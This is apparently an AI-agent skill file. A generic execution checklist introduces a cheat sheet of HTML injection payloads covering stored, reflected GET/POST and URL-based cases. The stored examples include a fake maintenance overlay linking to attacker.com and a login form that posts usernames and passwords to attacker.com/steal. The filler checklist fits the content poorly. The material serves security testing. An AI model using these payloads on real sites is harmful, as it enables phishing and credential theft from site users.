---
name: phase-4-types-of-html-injection
description: Use when executing phase 4 types of html injection protocols within the security sector.
---

# Phase 4 Types Of Html Injection: Execution Protocol

## ⚙️ Overview
This protocol defines the exact standards for implementing Phase 4 Types Of Html Injection. By following this strict operational pattern, the engine guarantees deterministic execution, high performance, and complete adherence to all architectural guardrails established by the system design.

## 🛠️ Implementation SOP
Follow this step-by-step TDD procedure to execute the protocol:

- **Step 1: Baseline Context**: Verify the operational environment. Ensure required tools (like Python, Node, TS, or native CLI) are accessible before injecting new logic.
- **Step 2: Apply the Pattern**: Implement the core phase 4 types of html injection logic directly into the active system context.
- **Step 3: Enforce Constraints**: Check for syntax errors, injection vulnerabilities, and performance bottlenecks (`O(1)` compliance).
- **Step 4: Execute Test Suite**: Run `npm run test` or the local testing framework to ensure the logic passes all regression checks.
- **Step 5: Document and Commit**: Update the session walkthrough and sync the telemetry logs for the security sector.

---

## 📚 Reference Material

# Phase 4: Types of HTML Injection

#### Stored HTML Injection

Payload persists in database:

```html
<!-- Profile bio injection -->
Name: John Doe
Bio: <div style="position:absolute;top:0;left:0;width:100%;height:100%;background:white;">
     <h1>Site Under Maintenance</h1>
     <p>Please login at <a href="http://attacker.com/login">portal.company.com</a></p>
     </div>

<!-- Comment injection -->
Great article!
<form action="http://attacker.com/steal" method="POST">
    <input name="username" placeholder="Session expired. Enter username:">
    <input name="password" type="password" placeholder="Password:">
    <input type="submit" value="Login">
</form>
```

#### Reflected GET Injection

Payload in URL parameters:

```html
<!-- URL injection -->
http://target.com/welcome?name=<h1>Welcome%20Admin</h1><form%20action="http://attacker.com/steal">

<!-- Search result injection -->
http://target.com/search?q=<marquee>Your%20account%20has%20been%20compromised</marquee>
```

#### Reflected POST Injection

Payload in POST data:

```bash
# POST injection test
curl -X POST -d "comment=<div style='color:red'>Malicious Content</div>" \
     http://target.com/submit

# Form field injection
curl -X POST -d "name=<script>alert(1)</script>&email=test@test.com" \
     http://target.com/register
```

#### URL-Based Injection

Inject into displayed URLs:

```html
<!-- If URL is displayed on page -->
http://target.com/page/<h1>Injected</h1>

<!-- Path-based injection -->
http://target.com/users/<img src=x>/profile
```